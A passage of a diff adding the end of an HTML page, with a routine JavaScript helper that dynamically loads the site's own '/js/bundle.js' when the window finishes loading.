+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
